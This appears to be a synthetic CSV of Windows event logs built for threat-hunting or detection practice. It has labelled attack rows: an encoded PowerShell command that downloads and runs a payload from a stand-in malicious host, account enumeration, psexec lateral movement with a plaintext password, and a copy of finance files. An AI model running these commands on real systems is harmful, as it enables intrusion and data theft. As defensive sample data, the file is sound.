TimeCreated,EventID,AccountName,LogonType,SourceIP,Computer,Process_Name,CommandLine,AdditionalInfo
2024-01-08 13:01:00,4688,john,2,192.168.1.21,WIN-01,powershell.exe,"powershell.exe -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA","Malicious encoded PowerShell"
2024-01-08 13:02:00,4688,john,2,192.168.1.21,WIN-01,cmd.exe,"cmd.exe /c whoami /all","Check privileges"
2024-01-08 13:03:00,4688,john,2,192.168.1.21,WIN-01,net.exe,"net.exe user","Enumerate users"
2024-01-08 15:09:20,4688,admin,2,203.0.113.88,WIN-ADMIN,psexec.exe,"psexec.exe \\\\WIN-DC -u admin -p Password123","Lateral movement"
2024-01-08 15:12:20,4688,admin,2,203.0.113.88,WIN-DC,cmd.exe,"cmd.exe /c copy C:\\Finance\\*.xlsx C:\\Temp\\","Data exfiltration"
2024-01-09 15:09:20,4688,admin,2,203.0.113.45,WIN-ADMIN,psexec.exe,"psexec.exe \\\\WIN-DC -u admin -p Password123",""
2024-01-10 15:09:20,4688,admin,2,203.0.113.45,WIN-ADMIN,psexec.exe,"psexec.exe \\\\WIN-DC -u admin -p Password123",""
2024-01-11 15:09:20,4688,admin,2,198.51.100.77,WIN-ADMIN,psexec.exe,"psexec.exe \\\\WIN-DC -u admin -p Password123",""
2024-01-12 15:09:20,4688,admin,2,203.0.113.88,WIN-ADMIN,psexec.exe,"psexec.exe \\\\WIN-DC -u admin -p Password123",""
2024-01-08 08:00:00,4624,sarah,2,192.168.1.20,WIN-02,,,
2024-01-08 08:07:00,4624,john,2,192.168.1.20,WIN-03,,,
2024-01-08 08:10:00,4624,sarah,2,192.168.1.20,WIN-02,,,
2024-01-08 08:18:00,4624,john,2,192.168.1.20,WIN-02,,,
